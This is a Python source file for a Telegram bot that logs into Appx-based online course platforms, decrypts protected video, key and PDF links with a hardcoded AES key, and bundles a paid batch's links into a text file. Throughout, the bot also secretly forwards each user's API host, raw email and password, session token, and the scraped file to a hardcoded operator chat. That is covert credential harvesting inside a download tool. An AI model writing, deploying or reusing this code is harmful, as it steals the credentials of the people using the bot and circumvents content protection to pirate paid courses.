import json
import requests
from pyrogram.types import InputMediaDocument
from pyrogram.types.messages_and_media import message
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from Crypto.Util.Padding import unpad
from pyrogram import Client, filters
from pyrogram import Client as bot
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.errors import FloodWait
from pyrogram.types import User, Message
import logging
import main
import binascii
import config
import time
import asyncio
import base64
import os
import cloudscraper
from Crypto.Cipher import AES
import datetime

time = datetime.datetime.now().strftime("%d-%m-%Y")

my_data = -1001938939742
sudo_group = config.GROUPS
ADMINS = config.ADMINS

def decode_base64(encoded_str):
    try:
        decoded_bytes = base64.b64decode(encoded_str)
        decoded_str = decoded_bytes.decode('utf-8')
        return decoded_str
    except Exception as e:
        return f"Error decoding string: {e}"

def decrypt(enc):
    try:
        enc = base64.b64decode(enc.split(':')[0] + '==')
        key = '638udh3829162018'.encode('utf-8')
        iv = 'fedcba9876543210'.encode('utf-8')
        if len(enc) == 0:
            return ""

        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(enc), AES.block_size)
        return plaintext.decode('utf-8')
    except (binascii.Error, ValueError) as e:
        print(f"Decryption error: {e}")
        return ""
    except Exception as e:
        print(f"Unexpected error during decryption: {e}")
        return ""

@bot.on_message(filters.command("api") & (filters.chat(sudo_group) | filters.user(ADMINS)))
#@bot.on_message(filters.command("api"))
async def start(bot, m):
    editable = await bot.send_message(m.chat.id, "**ðŸŒ Enter API :**")
    input01: Message = await bot.listen(editable.chat.id)
    raw_text05 = input01.text
    await input01.delete(True)
    await editable.edit("Send **Token** or **ID & Password** ðŸ§²")
    login_hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': '-2',
        'language': 'en',
        'device_type': 'ANDROID',
        #'Content-Length': '225',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        #'Accept-Encoding': 'gzip, deflate',
        'User-Agent': 'okhttp/4.9.1',
    }
    
    data = {
        'email': '',
        'password': '',
        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
        'mydeviceid': 'e4be9d04e8ca6e44',
    }
    input: Message = await bot.listen(editable.chat.id)
    raw_text = input.text
    await input.delete(True)
    if "*" in raw_text:
        data["email"] = raw_text.split("*")[0]
        data["password"] = raw_text.split("*")[1]    
        scraper = cloudscraper.create_scraper()    
        html = scraper.post("https://"+raw_text05+"/post/userLogin",data,headers=login_hdr).content
        output = json.loads(html)
        token = output["data"]["token"]
        userid = output["data"]["userid"]
    else:
        token = raw_text.split("$")[0]
        userid = raw_text.split("$")[1]
        
    hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': userid,
        'Authorization': token,
        'language': 'en',
        'device_type': 'ANDROID',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.1',
    }        
    scraper = cloudscraper.create_scraper()
    html1 = scraper.get("https://"+raw_text05+"/get/mycourse?userid=" + userid, headers = hdr).content
    output1 = json.loads(html1)
    topicid = output1["data"]
    
    cool = ""
    total_links = 0
    for data in topicid:
        aa = f" `{data['id']}` Â» {data['course_name']} âœ³ï¸ â‚¹{data['price']}\n\n"
        if len(f'{cool}{aa}') > 4096:
            print(aa)
            cool = ""
        cool += aa
    await editable.edit(f"Login successfull....âœ…âš™ï¸")
    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  âž¤  **BATCH NAME**\n\n{cool}\nSEND ID :")
    input1 = await bot.listen(editable.chat.id)
    raw_text1 = input1.text

    course_title = ""  
    for data in topicid:
        if data['id'] == raw_text1:
            batch_logo = data['course_thumbnail']
            course_title = data['course_name'].replace('/','')
    #await input1.delete(True)
    scraper = cloudscraper.create_scraper()
    html3 = scraper.get("https://"+raw_text05+"/get/allsubjectfrmlivecourseclass?courseid=" + raw_text1, headers=hdr).content
    output3 = json.loads(html3)
    topicid = output3["data"]
    for topic in topicid:
        tids = topic["subjectid"]
        subject_title = topic["subject_name"].replace(':', '')
        scraper = cloudscraper.create_scraper()
        html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
        output4 = json.loads(html4)
        vv = output4["data"]
        #tsids_list = []
        for data in vv:
            tsids = data['topicid']
            #tsids_list.append(tsids)
        #for tsids in tsids_list:
            response5 = requests.get(f"https://"+raw_text05+"/get/livecourseclassbycoursesubtopconceptapiv3?topicid=" + tsids + "&start=-1&courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).json()
            for i in range(len(response5["data"])):
                video_title = response5["data"][i]["Title"].strip() #.replace('||', '').replace('#', '').replace(':', '').replace(',', '').replace('@', '').replace('|', '')
                video_link = response5["data"][i]["download_link"]
                if video_link:
                    rexo = decrypt(video_link)      
                    video_link += f"\n({subject_title}) {video_title}:{rexo}"
                    total_links += 1
                else:
                    video_id = response5["data"][i]["id"]  
                    cleaned_json = requests.get(f"https://"+raw_text05+"/get/fetchVideoDetailsById?course_id=" + raw_text1 + "&video_id=" + video_id + "&ytflag=&folder_wise_course=0", headers=hdr).json()
                    #time.sleep(1)            
                    if cleaned_json:
                        vt = cleaned_json["data"].get("Title", "")
                        vl = cleaned_json["data"].get("download_link", "")
                        if vl:
                            dvl = decrypt(vl)
                            video_link += f"\n({subject_title}) {vt}:{dvl}"
                            total_links += 1
                        else:
                            vl = cleaned_json["data"]["encrypted_links"][0]["path"]
                            vll = decrypt(vl)
                            k = cleaned_json["data"]["encrypted_links"][0]["key"]
                            if k:
                                k1 = decrypt(k)
                                k2 = decode_base64(k1)
                                video_link += f"\n({subject_title}) {vt}:{vll}*{k2}"
                                total_links += 1
                            else:
                                video_link += f"\n({subject_title}) {vt}:{vll}"
                                total_links += 1
                        pdf_lk = cleaned_json["data"].get("pdf_link", "")
                        pdf_lk2 = cleaned_json["data"].get("pdf_link2", "")
                        if pdf_lk:
                            pdf_link_decrypted = decrypt(pdf_lk)
                            video_link += f"\n({subject_title}) {video_title} PDF:{pdf_link_decrypted}"
                            total_links += 1
                        if pdf_lk2:
                            pdf_link_decrypted2 = decrypt(pdf_lk2)
                            video_link += f"\n({subject_title}) {video_title} PDF:{pdf_link_decrypted2}"
                            total_links += 1
                with open(f"{course_title}.txt", 'a') as f:
                    f.write(video_link+"\n")
    caption_details = raw_text05.upper().replace("api.cloudflare.net.in","").replace("api.classx.co.in","").replace("api.teachx.co.in","")
    file1 = InputMediaDocument(f"{course_title}.txt", caption=f"**ðŸŒ Batch ID:** {raw_text1}\n**ðŸ“› Batch:** `{course_title}`\n**ðŸ”— Total Links:** {total_links}\n**ðŸ—“ Date:** {time}")
    await bot.send_media_group(my_data, [file1])
    await bot.send_media_group(m.chat.id, [file1])
    os.remove(f"{course_title}.txt")
    await bot.send_message(m.chat.id, "Batch Grabbing Done âœ…")
